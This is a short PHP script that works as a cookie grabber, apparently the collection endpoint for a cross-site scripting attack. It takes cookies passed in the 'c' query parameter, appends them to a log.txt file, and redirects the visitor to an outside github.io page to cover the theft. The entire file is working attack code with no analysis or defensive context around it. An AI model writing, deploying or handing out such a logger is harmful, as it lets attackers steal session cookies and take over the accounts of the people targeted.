<?php
header ('Location:https://blackofhat.github.io');
	$cookies = $_GET["c"];
		$file = fopen('log.txt', 'a');
		fwrite($file, $cookies . "\n\n");
?>